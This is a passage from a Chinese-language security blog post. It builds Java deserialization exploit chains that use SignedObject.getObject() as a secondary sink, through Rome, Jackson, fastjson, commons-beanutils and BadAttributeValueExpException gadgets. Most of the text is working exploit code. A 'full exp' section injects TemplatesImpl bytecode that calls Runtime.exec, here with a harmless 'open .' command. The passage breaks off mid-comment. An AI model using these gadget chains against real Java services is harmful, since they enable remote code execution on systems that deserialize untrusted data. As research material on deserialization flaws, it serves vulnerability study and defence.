class="hljs-string">&quot;sun.security.pkcs11.P11Signature&quot;</span>, TRUE);<br>&#125;<br></code></pre></td></tr></table></figure><p>jdk自带算法</p><p>根据自带算法，构造Signature的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(templates, privateKey,signature );<br></code></pre></td></tr></table></figure><h3 id="0x02-多种方法触发SignedObject-getObject"><a href="#0x02-多种方法触发SignedObject-getObject" class="headerlink" title="0x02 多种方法触发SignedObject.getObject()"></a>0x02 多种方法触发SignedObject.getObject()</h3><h4 id="一、依赖-hashmap-Rome"><a href="#一、依赖-hashmap-Rome" class="headerlink" title="一、依赖: hashmap-&gt;Rome"></a>一、依赖: hashmap-&gt;Rome</h4><p>因为调用SignedObject.getObject()。所以需要gettset来触发。有很多方法。</p><p>hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.ObjectBean.hashcode()-&gt;EqualsBean.javabeanHashCode()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br><span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class, signedObject);<br><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br><br>HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>hashMap1.put(root,<span class="hljs-string">&quot;x&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="二、依赖-BadAttributeValueExpException-Rome"><a href="#二、依赖-BadAttributeValueExpException-Rome" class="headerlink" title="二、依赖: BadAttributeValueExpException-&gt;Rome"></a>二、依赖: BadAttributeValueExpException-&gt;Rome</h4><p>BadAttributeValueExpException.readObject()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br><span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class, signedObject);<br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, toStringBean);<br></code></pre></td></tr></table></figure><h4 id="三、依赖：jackson"><a href="#三、依赖：jackson" class="headerlink" title="三、依赖：jackson"></a>三、依赖：jackson</h4><p>BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">// 保证能写入序列化数据，利用javassist删除writeReplace()。</span><br><span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool_1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool_1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        jsonNode.removeMethod(writeReplace);<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>        jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br>    <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>    <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>    <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>    <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>    signature.initSign(privateKey);<br>    <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, privateKey,signature );<br><br>    <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>    <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>    setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, jsonNodes1);<br></code></pre></td></tr></table></figure><h4 id="四、依赖：fastjson-1-2-48"><a href="#四、依赖：fastjson-1-2-48" class="headerlink" title="四、依赖：fastjson 1.2.48+"></a>四、依赖：fastjson 1.2.48+</h4><p>HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;<strong>com.alibaba.fastjson.JSONObject.toString()&#x2F;com.alibaba.fastjson.JSONArray.toString()</strong>-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JSONSerializer.java#write()-&gt;com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br>        <br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;222&quot;</span>,signedObject);<br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(signedObject);</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap1.put(signedObject,val1);<br></code></pre></td></tr></table></figure><h4 id="五、依赖：cb"><a href="#五、依赖：cb" class="headerlink" title="五、依赖：cb"></a>五、依赖：cb</h4><p>PriorityQueue.readObect()-&gt; org.apache.commons.beanutils.BeanComparator.compare()-&gt;PropertyUtils.getProperty()-&gt;SignedObject.getObject()-&gt;PropertyUtilsBean.java#getSimpleProperty()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>    <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>    <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>    <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>    signature.initSign(privateKey);<br>    <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br>BeanComparator&lt;Object&gt; objectBeanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;();<br>    setFieldValue(objectBeanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>);<br>    PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">1</span>);<br><br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,objectBeanComparator);<br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>    Object[] objects = &#123;signedObject, <span class="hljs-number">1</span>&#125;;<br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br></code></pre></td></tr></table></figure><h3 id="0x03-完整exp"><a href="#0x03-完整exp" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc5_Templateslmpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.util.TreeMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">signedobject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br><br><span class="hljs-comment">//        一、利用链：hashmap-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.EqualsBean.javabeanHashCode()-&gt;EqualsBean.toString()-&gt;jackson.databind.node.POJONode.toString()-&gt;com.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;templates.getOutputProperties()</span><br><span class="hljs-comment">//        POJONode jsonNodes = new POJONode(templates);</span><br><span class="hljs-comment">//        EqualsBean bean = new EqualsBean(String.class, &quot;22&quot;);</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap.put(bean,&quot;222&quot;);</span><br><span class="hljs-comment">//        setFieldValue(bean,&quot;_obj&quot;,jsonNodes);</span><br><br><span class="hljs-comment">//       二、利用链：HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;**com.alibaba.fastjson.JSONObject.toString()/com.alibaba.fastjson.JSONArray.toString()**-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com/alibaba/fastjson/serializer/JSONSerializer.java#write()-&gt;com/alibaba/fastjson/serializer/ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;templates.getOutputProperties()</span><br><span class="hljs-comment">//        JSONObject jsonObject = new JSONObject();</span><br><span class="hljs-comment">//        jsonObject.put(&quot;1&quot;,templates);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        BadAttributeValueExpException val = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val, &quot;val&quot;, jsonObject);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap2.put(templates,val);</span><br><br><span class="hljs-comment">//        三、利用链：BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;templates.getOutputProperties()</span><br>      <br><span class="hljs-comment">//        删除 BaseJsonNode 的 writeReplace,使能写入序列化数据</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool_1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool_1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, jsonNodes);<br><br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(val, privateKey,signature );<br><br><br><span class="hljs-comment">//        一、利用链：hashmap-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.ObjectBean.hashcode()-&gt;EqualsBean.javabeanHashCode()-&gt;oStringBean.java#toString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="hljs-comment">//        ObjectBean root = new ObjectBean(ToStringBean.class, toStringBean);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap1.put(root,&quot;x&quot;);</span><br><br><span class="hljs-comment">//        二、BadAttributeValueExpException.readObject()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, toStringBean);</span><br><br><span class="hljs-comment">//        三、BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;SignedObject.getObject()</span><br><span class="hljs-comment">//        POJONode jsonNodes1 = new POJONode(signedObject);</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, jsonNodes1);</span><br><br><br><span class="hljs-comment">//        